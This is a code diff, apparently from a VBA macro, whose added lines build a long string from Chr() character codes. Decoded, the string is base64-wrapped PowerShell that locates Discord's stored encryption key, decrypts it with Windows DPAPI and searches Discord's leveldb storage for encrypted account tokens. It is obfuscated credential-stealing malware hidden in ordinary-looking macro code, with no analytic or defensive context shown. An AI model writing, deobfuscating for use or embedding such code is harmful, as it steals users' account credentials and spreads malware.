+X19 = X19 & (Chr(73)&Chr(72)&Chr(116)&Chr(57)&Chr(67)&Chr(103)&Chr(111)&Chr(107)&Chr(100)&Chr(71)&Chr(57)&Chr(114)&Chr(90)&Chr(87)&Chr(53)&Chr(122)&Chr(73)&Chr(68)&Chr(48)&Chr(103)&Chr(81)&Chr(72)&Chr(116)&Chr(57)&Chr(67)&Chr(103)&Chr(112)&Chr(109)&Chr(100)&Chr(87)&Chr(53)&Chr(106)&Chr(100)&Chr(71)&Chr(108)&Chr(118)&Chr(98)&Chr(105)&Chr(66)&Chr(83)&Chr(90)&Chr(87)&Chr(70)&Chr(107)&Chr(76)&Chr(85)&Chr(90)&Chr(112)&Chr(98)&Chr(71)&Chr(86)&Chr(85)&Chr(90)&Chr(88)&Chr(104)&Chr(48)&Chr(75)&Chr(67)&Chr(82)&Chr(119)&Chr(89)&Chr(88)&Chr(82)&Chr(111)&Chr(75)&Chr(83)&Chr(66)&Chr(55)&Chr(67)&Chr(105)&Chr(65)&Chr(103))
+X19 = X19 & (Chr(73)&Chr(67)&Chr(65)&Chr(107)&Chr(99)&Chr(105)&Chr(65)&Chr(57)&Chr(73)&Chr(67)&Chr(82)&Chr(117)&Chr(100)&Chr(87)&Chr(120)&Chr(115)&Chr(67)&Chr(105)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(66)&Chr(48)&Chr(99)&Chr(110)&Chr(107)&Chr(103)&Chr(101)&Chr(119)&Chr(111)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(82)&Chr(109)&Chr(99)&Chr(121)&Chr(65)&Chr(57)&Chr(73)&Chr(70)&Chr(116)&Chr(74)&Chr(84)&Chr(121)&Chr(53)&Chr(71)&Chr(97)&Chr(87)&Chr(120)&Chr(108)&Chr(88)&Chr(84)&Chr(111)&Chr(54)&Chr(84)&Chr(51)&Chr(66)&Chr(108)&Chr(98)&Chr(105)&Chr(103)&Chr(107))
+X19 = X19 & (Chr(99)&Chr(71)&Chr(70)&Chr(48)&Chr(97)&Chr(67)&Chr(119)&Chr(103)&Chr(87)&Chr(48)&Chr(108)&Chr(80)&Chr(76)&Chr(107)&Chr(90)&Chr(112)&Chr(98)&Chr(71)&Chr(86)&Chr(78)&Chr(98)&Chr(50)&Chr(82)&Chr(108)&Chr(88)&Chr(84)&Chr(111)&Chr(54)&Chr(84)&Chr(51)&Chr(66)&Chr(108)&Chr(98)&Chr(105)&Chr(119)&Chr(103)&Chr(87)&Chr(48)&Chr(108)&Chr(80)&Chr(76)&Chr(107)&Chr(90)&Chr(112)&Chr(98)&Chr(71)&Chr(86)&Chr(66)&Chr(89)&Chr(50)&Chr(78)&Chr(108)&Chr(99)&Chr(51)&Chr(78)&Chr(100)&Chr(79)&Chr(106)&Chr(112)&Chr(83)&Chr(90)&Chr(87)&Chr(70)&Chr(107)&Chr(76)&Chr(67)&Chr(66)&Chr(98)&Chr(83)&Chr(85)&Chr(56)&Chr(117))
+X19 = X19 & (Chr(82)&Chr(109)&Chr(108)&Chr(115)&Chr(90)&Chr(86)&Chr(78)&Chr(111)&Chr(89)&Chr(88)&Chr(74)&Chr(108)&Chr(88)&Chr(84)&Chr(111)&Chr(54)&Chr(85)&Chr(109)&Chr(86)&Chr(104)&Chr(90)&Chr(70)&Chr(100)&Chr(121)&Chr(97)&Chr(88)&Chr(82)&Chr(108)&Chr(75)&Chr(81)&Chr(111)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(82)&Chr(122)&Chr(99)&Chr(105)&Chr(65)&Chr(57)&Chr(73)&Chr(69)&Chr(53)&Chr(108)&Chr(100)&Chr(121)&Chr(49)&Chr(80)&Chr(89)&Chr(109)&Chr(112)&Chr(108)&Chr(89)&Chr(51)&Chr(81)&Chr(103)&Chr(83)&Chr(85)&Chr(56)&Chr(117)&Chr(85)&Chr(51)&Chr(82)&Chr(121))
+X19 = X19 & (Chr(90)&Chr(87)&Chr(70)&Chr(116)&Chr(85)&Chr(109)&Chr(86)&Chr(104)&Chr(90)&Chr(71)&Chr(86)&Chr(121)&Chr(75)&Chr(67)&Chr(82)&Chr(109)&Chr(99)&Chr(121)&Chr(107)&Chr(75)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(107)&Chr(99)&Chr(105)&Chr(65)&Chr(57)&Chr(73)&Chr(67)&Chr(82)&Chr(122)&Chr(99)&Chr(105)&Chr(53)&Chr(83)&Chr(90)&Chr(87)&Chr(70)&Chr(107)&Chr(86)&Chr(71)&Chr(57)&Chr(70)&Chr(98)&Chr(109)&Chr(81)&Chr(111)&Chr(75)&Chr(84)&Chr(115)&Chr(103)&Chr(74)&Chr(72)&Chr(78)&Chr(121)&Chr(76)&Chr(107)&Chr(78)&Chr(115)&Chr(98)&Chr(51)&Chr(78)&Chr(108))
+X19 = X19 & (Chr(75)&Chr(67)&Chr(107)&Chr(55)&Chr(73)&Chr(67)&Chr(82)&Chr(109)&Chr(99)&Chr(121)&Chr(53)&Chr(68)&Chr(98)&Chr(71)&Chr(57)&Chr(122)&Chr(90)&Chr(83)&Chr(103)&Chr(112)&Chr(67)&Chr(105)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(66)&Chr(57)&Chr(73)&Chr(71)&Chr(78)&Chr(104)&Chr(100)&Chr(71)&Chr(78)&Chr(111)&Chr(73)&Chr(72)&Chr(116)&Chr(57)&Chr(67)&Chr(105)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(66)&Chr(121)&Chr(90)&Chr(88)&Chr(82)&Chr(49)&Chr(99)&Chr(109)&Chr(52)&Chr(103)&Chr(74)&Chr(72)&Chr(73)&Chr(75)&Chr(102)&Chr(81)&Chr(111)&Chr(75)&Chr(73)&Chr(121)&Chr(65)&Chr(116)&Chr(76)&Chr(83)&Chr(48)&Chr(116))
+X19 = X19 & (Chr(73)&Chr(69)&Chr(82)&Chr(108)&Chr(99)&Chr(50)&Chr(116)&Chr(48)&Chr(98)&Chr(51)&Chr(65)&Chr(103)&Chr(82)&Chr(71)&Chr(108)&Chr(122)&Chr(89)&Chr(50)&Chr(57)&Chr(121)&Chr(90)&Chr(67)&Chr(66)&Chr(106)&Chr(98)&Chr(71)&Chr(108)&Chr(108)&Chr(98)&Chr(110)&Chr(82)&Chr(122)&Chr(73)&Chr(67)&Chr(104)&Chr(48)&Chr(98)&Chr(50)&Chr(116)&Chr(108)&Chr(98)&Chr(105)&Chr(66)&Chr(108)&Chr(98)&Chr(109)&Chr(78)&Chr(121)&Chr(101)&Chr(88)&Chr(66)&Chr(48)&Chr(90)&Chr(87)&Chr(81)&Chr(103)&Chr(100)&Chr(50)&Chr(108)&Chr(48)&Chr(97)&Chr(67)&Chr(66)&Chr(107)&Chr(85)&Chr(88)&Chr(99)&Chr(48)&Chr(100)&Chr(122)&Chr(108)&Chr(88))
+X19 = X19 & (Chr(90)&Chr(49)&Chr(104)&Chr(106)&Chr(85)&Chr(83)&Chr(66)&Chr(114)&Chr(90)&Chr(88)&Chr(107)&Chr(112)&Chr(73)&Chr(67)&Chr(48)&Chr(116)&Chr(76)&Chr(83)&Chr(48)&Chr(75)&Chr(74)&Chr(71)&Chr(48)&Chr(119)&Chr(73)&Chr(68)&Chr(48)&Chr(103)&Chr(74)&Chr(71)&Chr(53)&Chr(49)&Chr(98)&Chr(71)&Chr(119)&Chr(75)&Chr(100)&Chr(72)&Chr(74)&Chr(53)&Chr(73)&Chr(72)&Chr(115)&Chr(75)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(82)&Chr(119)&Chr(77)&Chr(67)&Chr(65)&Chr(57)&Chr(73)&Chr(67)&Chr(73)&Chr(107)&Chr(90)&Chr(87)&Chr(53)&Chr(50)&Chr(79)&Chr(107)&Chr(70)&Chr(81)&Chr(85)&Chr(69)&Chr(82)&Chr(66))
+X19 = X19 & (Chr(86)&Chr(69)&Chr(70)&Chr(99)&Chr(90)&Chr(71)&Chr(108)&Chr(122)&Chr(89)&Chr(50)&Chr(57)&Chr(121)&Chr(90)&Chr(70)&Chr(120)&Chr(77)&Chr(98)&Chr(50)&Chr(78)&Chr(104)&Chr(98)&Chr(67)&Chr(66)&Chr(84)&Chr(100)&Chr(71)&Chr(70)&Chr(48)&Chr(90)&Chr(83)&Chr(73)&Chr(75)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(82)&Chr(113)&Chr(77)&Chr(67)&Chr(65)&Chr(57)&Chr(73)&Chr(69)&Chr(100)&Chr(108)&Chr(100)&Chr(67)&Chr(49)&Chr(68)&Chr(98)&Chr(50)&Chr(53)&Chr(48)&Chr(90)&Chr(87)&Chr(53)&Chr(48)&Chr(73)&Chr(67)&Chr(82)&Chr(119)&Chr(77)&Chr(67)&Chr(65)&Chr(116)&Chr(85)&Chr(109)&Chr(70)&Chr(51))
+X19 = X19 & (Chr(73)&Chr(72)&Chr(119)&Chr(103)&Chr(81)&Chr(50)&Chr(57)&Chr(117)&Chr(100)&Chr(109)&Chr(86)&Chr(121)&Chr(100)&Chr(69)&Chr(90)&Chr(121)&Chr(98)&Chr(50)&Chr(48)&Chr(116)&Chr(83)&Chr(110)&Chr(78)&Chr(118)&Chr(98)&Chr(103)&Chr(111)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(74)&Chr(71)&Chr(73)&Chr(119)&Chr(73)&Chr(68)&Chr(48)&Chr(103)&Chr(87)&Chr(48)&Chr(78)&Chr(118)&Chr(98)&Chr(110)&Chr(90)&Chr(108)&Chr(99)&Chr(110)&Chr(82)&Chr(100)&Chr(79)&Chr(106)&Chr(112)&Chr(71)&Chr(99)&Chr(109)&Chr(57)&Chr(116)&Chr(81)&Chr(109)&Chr(70)&Chr(122)&Chr(90)&Chr(84)&Chr(89)&Chr(48)&Chr(85)&Chr(51)&Chr(82)&Chr(121))
+X19 = X19 & (Chr(97)&Chr(87)&Chr(53)&Chr(110)&Chr(75)&Chr(67)&Chr(82)&Chr(113)&Chr(77)&Chr(67)&Chr(53)&Chr(118)&Chr(99)&Chr(49)&Chr(57)&Chr(106)&Chr(99)&Chr(110)&Chr(108)&Chr(119)&Chr(100)&Chr(67)&Chr(53)&Chr(108)&Chr(98)&Chr(109)&Chr(78)&Chr(121)&Chr(101)&Chr(88)&Chr(66)&Chr(48)&Chr(90)&Chr(87)&Chr(82)&Chr(102)&Chr(97)&Chr(50)&Chr(86)&Chr(53)&Chr(75)&Chr(81)&Chr(111)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(74)&Chr(71)&Chr(48)&Chr(119)&Chr(73)&Chr(68)&Chr(48)&Chr(103)&Chr(87)&Chr(49)&Chr(78)&Chr(108)&Chr(89)&Chr(51)&Chr(86)&Chr(121)&Chr(97)&Chr(88)&Chr(82)&Chr(53)&Chr(76)&Chr(107)&Chr(78)&Chr(121))
+X19 = X19 & (Chr(101)&Chr(88)&Chr(66)&Chr(48)&Chr(98)&Chr(50)&Chr(100)&Chr(121)&Chr(89)&Chr(88)&Chr(66)&Chr(111)&Chr(101)&Chr(83)&Chr(53)&Chr(81)&Chr(99)&Chr(109)&Chr(57)&Chr(48)&Chr(90)&Chr(87)&Chr(78)&Chr(48)&Chr(90)&Chr(87)&Chr(82)&Chr(69)&Chr(89)&Chr(88)&Chr(82)&Chr(104)&Chr(88)&Chr(84)&Chr(111)&Chr(54)&Chr(86)&Chr(87)&Chr(53)&Chr(119)&Chr(99)&Chr(109)&Chr(57)&Chr(48)&Chr(90)&Chr(87)&Chr(78)&Chr(48)&Chr(75)&Chr(67)&Chr(82)&Chr(105)&Chr(77)&Chr(70)&Chr(115)&Chr(49)&Chr(76)&Chr(105)&Chr(52)&Chr(111)&Chr(74)&Chr(71)&Chr(73)&Chr(119)&Chr(76)&Chr(107)&Chr(120)&Chr(108)&Chr(98)&Chr(109)&Chr(100)&Chr(48))
+X19 = X19 & (Chr(97)&Chr(67)&Chr(65)&Chr(116)&Chr(73)&Chr(68)&Chr(69)&Chr(112)&Chr(88)&Chr(83)&Chr(119)&Chr(103)&Chr(74)&Chr(71)&Chr(53)&Chr(49)&Chr(98)&Chr(71)&Chr(119)&Chr(115)&Chr(73)&Chr(70)&Chr(116)&Chr(84)&Chr(90)&Chr(87)&Chr(78)&Chr(49)&Chr(99)&Chr(109)&Chr(108)&Chr(48)&Chr(101)&Chr(83)&Chr(53)&Chr(68)&Chr(99)&Chr(110)&Chr(108)&Chr(119)&Chr(100)&Chr(71)&Chr(57)&Chr(110)&Chr(99)&Chr(109)&Chr(70)&Chr(119)&Chr(97)&Chr(72)&Chr(107)&Chr(117)&Chr(82)&Chr(71)&Chr(70)&Chr(48)&Chr(89)&Chr(86)&Chr(66)&Chr(121)&Chr(98)&Chr(51)&Chr(82)&Chr(108)&Chr(89)&Chr(51)&Chr(82)&Chr(112)&Chr(98)&Chr(50)&Chr(53)&Chr(84))
+X19 = X19 & (Chr(89)&Chr(50)&Chr(57)&Chr(119)&Chr(90)&Chr(86)&Chr(48)&Chr(54)&Chr(79)&Chr(107)&Chr(78)&Chr(49)&Chr(99)&Chr(110)&Chr(74)&Chr(108)&Chr(98)&Chr(110)&Chr(82)&Chr(86)&Chr(99)&Chr(50)&Chr(86)&Chr(121)&Chr(75)&Chr(81)&Chr(112)&Chr(57)&Chr(73)&Chr(71)&Chr(78)&Chr(104)&Chr(100)&Chr(71)&Chr(78)&Chr(111)&Chr(73)&Chr(72)&Chr(116)&Chr(57)&Chr(67)&Chr(103)&Chr(112)&Chr(109)&Chr(98)&Chr(51)&Chr(74)&Chr(108)&Chr(89)&Chr(87)&Chr(78)&Chr(111)&Chr(73)&Chr(67)&Chr(103)&Chr(107)&Chr(90)&Chr(71)&Chr(108)&Chr(121)&Chr(73)&Chr(71)&Chr(108)&Chr(117)&Chr(73)&Chr(69)&Chr(65)&Chr(111)&Chr(67)&Chr(105)&Chr(65)&Chr(103))
+X19 = X19 & (Chr(73)&Chr(67)&Chr(65)&Chr(105)&Chr(74)&Chr(71)&Chr(86)&Chr(117)&Chr(100)&Chr(106)&Chr(112)&Chr(66)&Chr(85)&Chr(70)&Chr(66)&Chr(69)&Chr(81)&Chr(86)&Chr(82)&Chr(66)&Chr(88)&Chr(71)&Chr(82)&Chr(112)&Chr(99)&Chr(50)&Chr(78)&Chr(118)&Chr(99)&Chr(109)&Chr(82)&Chr(99)&Chr(84)&Chr(71)&Chr(57)&Chr(106)&Chr(89)&Chr(87)&Chr(119)&Chr(103)&Chr(85)&Chr(51)&Chr(82)&Chr(118)&Chr(99)&Chr(109)&Chr(70)&Chr(110)&Chr(90)&Chr(86)&Chr(120)&Chr(115)&Chr(90)&Chr(88)&Chr(90)&Chr(108)&Chr(98)&Chr(71)&Chr(82)&Chr(105)&Chr(73)&Chr(105)&Chr(119)&Chr(75)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(73)&Chr(107))
+X19 = X19 & (Chr(90)&Chr(87)&Chr(53)&Chr(50)&Chr(79)&Chr(107)&Chr(70)&Chr(81)&Chr(85)&Chr(69)&Chr(82)&Chr(66)&Chr(86)&Chr(69)&Chr(70)&Chr(99)&Chr(90)&Chr(71)&Chr(108)&Chr(122)&Chr(89)&Chr(50)&Chr(57)&Chr(121)&Chr(90)&Chr(72)&Chr(66)&Chr(48)&Chr(89)&Chr(108)&Chr(120)&Chr(77)&Chr(98)&Chr(50)&Chr(78)&Chr(104)&Chr(98)&Chr(67)&Chr(66)&Chr(84)&Chr(100)&Chr(71)&Chr(57)&Chr(121)&Chr(89)&Chr(87)&Chr(100)&Chr(108)&Chr(88)&Chr(71)&Chr(120)&Chr(108)&Chr(100)&Chr(109)&Chr(86)&Chr(115)&Chr(90)&Chr(71)&Chr(73)&Chr(105)&Chr(76)&Chr(65)&Chr(111)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(105)&Chr(82)&Chr(108))
+X19 = X19 & (Chr(98)&Chr(110)&Chr(89)&Chr(54)&Chr(81)&Chr(86)&Chr(66)&Chr(81)&Chr(82)&Chr(69)&Chr(70)&Chr(85)&Chr(81)&Chr(86)&Chr(120)&Chr(107)&Chr(97)&Chr(88)&Chr(78)&Chr(106)&Chr(98)&Chr(51)&Chr(74)&Chr(107)&Chr(89)&Chr(50)&Chr(70)&Chr(117)&Chr(89)&Chr(88)&Chr(74)&Chr(53)&Chr(88)&Chr(69)&Chr(120)&Chr(118)&Chr(89)&Chr(50)&Chr(70)&Chr(115)&Chr(73)&Chr(70)&Chr(78)&Chr(48)&Chr(98)&Chr(51)&Chr(74)&Chr(104)&Chr(90)&Chr(50)&Chr(86)&Chr(99)&Chr(98)&Chr(71)&Chr(86)&Chr(50)&Chr(90)&Chr(87)&Chr(120)&Chr(107)&Chr(89)&Chr(105)&Chr(73)&Chr(75)&Chr(75)&Chr(83)&Chr(107)&Chr(103)&Chr(101)&Chr(119)&Chr(111)&Chr(103))
+X19 = X19 & (Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(97)&Chr(87)&Chr(89)&Chr(103)&Chr(75)&Chr(67)&Chr(69)&Chr(111)&Chr(86)&Chr(71)&Chr(86)&Chr(122)&Chr(100)&Chr(67)&Chr(49)&Chr(81)&Chr(89)&Chr(88)&Chr(82)&Chr(111)&Chr(73)&Chr(67)&Chr(82)&Chr(107)&Chr(97)&Chr(88)&Chr(73)&Chr(112)&Chr(75)&Chr(83)&Chr(66)&Chr(55)&Chr(73)&Chr(71)&Chr(78)&Chr(118)&Chr(98)&Chr(110)&Chr(82)&Chr(112)&Chr(98)&Chr(110)&Chr(86)&Chr(108)&Chr(73)&Chr(72)&Chr(48)&Chr(75)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(82)&Chr(109)&Chr(97)&Chr(87)&Chr(120)&Chr(108)&Chr(99)&Chr(121)&Chr(65)&Chr(57)&Chr(73)&Chr(69)&Chr(100)&Chr(108))
+X19 = X19 & (Chr(100)&Chr(67)&Chr(49)&Chr(68)&Chr(97)&Chr(71)&Chr(108)&Chr(115)&Chr(90)&Chr(69)&Chr(108)&Chr(48)&Chr(90)&Chr(87)&Chr(48)&Chr(103)&Chr(74)&Chr(71)&Chr(82)&Chr(112)&Chr(99)&Chr(105)&Chr(65)&Chr(116)&Chr(82)&Chr(109)&Chr(108)&Chr(115)&Chr(90)&Chr(83)&Chr(65)&Chr(116)&Chr(82)&Chr(88)&Chr(74)&Chr(121)&Chr(98)&Chr(51)&Chr(74)&Chr(66)&Chr(89)&Chr(51)&Chr(82)&Chr(112)&Chr(98)&Chr(50)&Chr(52)&Chr(103)&Chr(85)&Chr(50)&Chr(108)&Chr(115)&Chr(90)&Chr(87)&Chr(53)&Chr(48)&Chr(98)&Chr(72)&Chr(108)&Chr(68)&Chr(98)&Chr(50)&Chr(53)&Chr(48)&Chr(97)&Chr(87)&Chr(53)&Chr(49)&Chr(90)&Chr(83)&Chr(66)&Chr(56))
+X19 = X19 & (Chr(73)&Chr(70)&Chr(100)&Chr(111)&Chr(90)&Chr(88)&Chr(74)&Chr(108)&Chr(76)&Chr(85)&Chr(57)&Chr(105)&Chr(97)&Chr(109)&Chr(86)&Chr(106)&Chr(100)&Chr(67)&Chr(66)&Chr(55)&Chr(73)&Chr(67)&Chr(82)&Chr(102)&Chr(76)&Chr(107)&Chr(53)&Chr(104)&Chr(98)&Chr(87)&Chr(85)&Chr(103)&Chr(76)&Chr(87)&Chr(49)&Chr(104)&Chr(100)&Chr(71)&Chr(78)&Chr(111)&Chr(73)&Chr(67)&Chr(100)&Chr(99)&Chr(76)&Chr(105)&Chr(104)&Chr(115)&Chr(90)&Chr(71)&Chr(74)&Chr(56)&Chr(98)&Chr(71)&Chr(57)&Chr(110)&Chr(75)&Chr(83)&Chr(81)&Chr(110)&Chr(73)&Chr(72)&Chr(48)&Chr(75)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(71)&Chr(90)&Chr(118))
+X19 = X19 & (Chr(99)&Chr(109)&Chr(86)&Chr(104)&Chr(89)&Chr(50)&Chr(103)&Chr(103)&Chr(75)&Chr(67)&Chr(82)&Chr(109)&Chr(73)&Chr(71)&Chr(108)&Chr(117)&Chr(73)&Chr(67)&Chr(82)&Chr(109)&Chr(97)&Chr(87)&Chr(120)&Chr(108)&Chr(99)&Chr(121)&Chr(107)&Chr(103)&Chr(101)&Chr(119)&Chr(111)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(82)&Chr(121)&Chr(73)&Chr(68)&Chr(48)&Chr(103)&Chr(85)&Chr(109)&Chr(86)&Chr(104)&Chr(90)&Chr(67)&Chr(49)&Chr(71)&Chr(97)&Chr(87)&Chr(120)&Chr(108)&Chr(86)&Chr(71)&Chr(86)&Chr(52)&Chr(100)&Chr(67)&Chr(65)&Chr(107)&Chr(90)&Chr(105)&Chr(53)&Chr(71))
+X19 = X19 & (Chr(100)&Chr(87)&Chr(120)&Chr(115)&Chr(84)&Chr(109)&Chr(70)&Chr(116)&Chr(90)&Chr(81)&Chr(111)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(71)&Chr(108)&Chr(109)&Chr(73)&Chr(67)&Chr(103)&Chr(104)&Chr(74)&Chr(72)&Chr(73)&Chr(103)&Chr(76)&Chr(87)&Chr(57)&Chr(121)&Chr(73)&Chr(67)&Chr(69)&Chr(107)&Chr(98)&Chr(84)&Chr(65)&Chr(112)&Chr(73)&Chr(72)&Chr(115)&Chr(103)&Chr(89)&Chr(50)&Chr(57)&Chr(117)&Chr(100)&Chr(71)&Chr(108)&Chr(117)&Chr(100)&Chr(87)&Chr(85)&Chr(103)&Chr(102)&Chr(81)&Chr(111)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103))
+X19 = X19 & (Chr(73)&Chr(71)&Chr(90)&Chr(118)&Chr(99)&Chr(109)&Chr(86)&Chr(104)&Chr(89)&Chr(50)&Chr(103)&Chr(103)&Chr(75)&Chr(67)&Chr(82)&Chr(116)&Chr(73)&Chr(71)&Chr(108)&Chr(117)&Chr(73)&Chr(70)&Chr(116)&Chr(121)&Chr(90)&Chr(87)&Chr(100)&Chr(108)&Chr(101)&Chr(70)&Chr(48)&Chr(54)&Chr(79)&Chr(107)&Chr(49)&Chr(104)&Chr(100)&Chr(71)&Chr(78)&Chr(111)&Chr(90)&Chr(88)&Chr(77)&Chr(111)&Chr(74)&Chr(72)&Chr(73)&Chr(115)&Chr(73)&Chr(67)&Chr(100)&Chr(107)&Chr(85)&Chr(88)&Chr(99)&Chr(48)&Chr(100)&Chr(122)&Chr(108)&Chr(88)&Chr(90)&Chr(49)&Chr(104)&Chr(106)&Chr(85)&Chr(84)&Chr(111)&Chr(111)&Chr(87)&Chr(48)&Chr(69)&Chr(116))
+X19 = X19 & (Chr(87)&Chr(109)&Chr(69)&Chr(116)&Chr(101)&Chr(106)&Chr(65)&Chr(116)&Chr(79)&Chr(83)&Chr(115)&Chr(118)&Chr(80)&Chr(86)&Chr(49)&Chr(55)&Chr(78)&Chr(68)&Chr(65)&Chr(115)&Chr(77)&Chr(122)&Chr(65)&Chr(119)&Chr(102)&Chr(83)&Chr(107)&Chr(110)&Chr(75)&Chr(83)&Chr(107)&Chr(103)&Chr(101)&Chr(119)&Chr(111)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(107)&Chr(89)&Chr(106)&Chr(89)&Chr(48)&Chr(73)&Chr(68)&Chr(48)&Chr(103)&Chr(74)&Chr(71)&Chr(48)&Chr(117)&Chr(82)&Chr(51)&Chr(74)&Chr(118)&Chr(100)&Chr(88)&Chr(66)&Chr(122))
+X19 = X19 & (Chr(87)&Chr(122)&Chr(70)&Chr(100)&Chr(76)&Chr(108)&Chr(90)&Chr(104)&Chr(98)&Chr(72)&Chr(86)&Chr(108)&Chr(67)&Chr(105)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(72)&Chr(100)&Chr(111)&Chr(97)&Chr(87)&Chr(120)&Chr(108)&Chr(73)&Chr(67)&Chr(103)&Chr(107)&Chr(89)&Chr(106)&Chr(89)&Chr(48)&Chr(76)&Chr(107)&Chr(120)&Chr(108)&Chr(98)&Chr(109)&Chr(100)&Chr(48)&Chr(97)&Chr(67)&Chr(65)&Chr(108)&Chr(73)&Chr(68)&Chr(81)&Chr(103)&Chr(76)&Chr(87)&Chr(53)&Chr(108)&Chr(73)&Chr(68)&Chr(65)&Chr(112)&Chr(73)&Chr(72)&Chr(115)&Chr(103))
+X19 = X19 & (Chr(74)&Chr(71)&Chr(73)&Chr(50)&Chr(78)&Chr(67)&Chr(65)&Chr(114)&Chr(80)&Chr(83)&Chr(65)&Chr(110)&Chr(80)&Chr(83)&Chr(99)&Chr(103)&Chr(102)&Chr(81)&Chr(111)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(66)&Chr(48)&Chr(99)&Chr(110)&Chr(107)&Chr(103)&Chr(101)&Chr(119)&Chr(111)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(74)&Chr(71)&Chr(85)&Chr(103)&Chr(80)&Chr(83)&Chr(66)&Chr(98))
+X19 = X19 & (Chr(81)&Chr(50)&Chr(57)&Chr(117)&Chr(100)&Chr(109)&Chr(86)&Chr(121)&Chr(100)&Chr(70)&Chr(48)&Chr(54)&Chr(79)&Chr(107)&Chr(90)&Chr(121)&Chr(98)&Chr(50)&Chr(49)&Chr(67)&Chr(89)&Chr(88)&Chr(78)&Chr(108)&Chr(78)&Chr(106)&Chr(82)&Chr(84)&Chr(100)&Chr(72)&Chr(74)&Chr(112)&Chr(98)&Chr(109)&Chr(99)&Chr(111)&Chr(74)&Chr(71)&Chr(73)&Chr(50)&Chr(78)&Chr(67)&Chr(107)&Chr(75)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(71)&Chr(108)&Chr(109)&Chr(73)&Chr(67)&Chr(103)&Chr(107))
+X19 = X19 & (Chr(90)&Chr(83)&Chr(53)&Chr(77)&Chr(90)&Chr(87)&Chr(53)&Chr(110)&Chr(100)&Chr(71)&Chr(103)&Chr(103)&Chr(76)&Chr(87)&Chr(120)&Chr(48)&Chr(73)&Chr(68)&Chr(103)&Chr(119)&Chr(75)&Chr(83)&Chr(66)&Chr(55)&Chr(73)&Chr(71)&Chr(78)&Chr(118)&Chr(98)&Chr(110)&Chr(82)&Chr(112)&Chr(98)&Chr(110)&Chr(86)&Chr(108)&Chr(73)&Chr(72)&Chr(48)&Chr(75)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(82)&Chr(48)&Chr(97)&Chr(121)&Chr(65)&Chr(57)&Chr(73)&Chr(70)&Chr(116)&Chr(85))
+X19 = X19 & (Chr(90)&Chr(88)&Chr(104)&Chr(48)&Chr(76)&Chr(107)&Chr(86)&Chr(117)&Chr(89)&Chr(50)&Chr(57)&Chr(107)&Chr(97)&Chr(87)&Chr(53)&Chr(110)&Chr(88)&Chr(84)&Chr(111)&Chr(54)&Chr(86)&Chr(86)&Chr(82)&Chr(71)&Chr(79)&Chr(67)&Chr(53)&Chr(72)&Chr(90)&Chr(88)&Chr(82)&Chr(84)&Chr(100)&Chr(72)&Chr(74)&Chr(112)&Chr(98)&Chr(109)&Chr(99)&Chr(111)&Chr(87)&Chr(48)&Chr(82)&Chr(89)&Chr(88)&Chr(84)&Chr(111)&Chr(54)&Chr(82)&Chr(67)&Chr(103)&Chr(107)&Chr(98)&Chr(84)&Chr(65)&Chr(115)&Chr(73)&Chr(67)&Chr(82)&Chr(108)&Chr(87)&Chr(122)&Chr(77)&Chr(117)&Chr(76)&Chr(106)&Chr(69)&Chr(48)&Chr(88)&Chr(83)&Chr(119)&Chr(103))
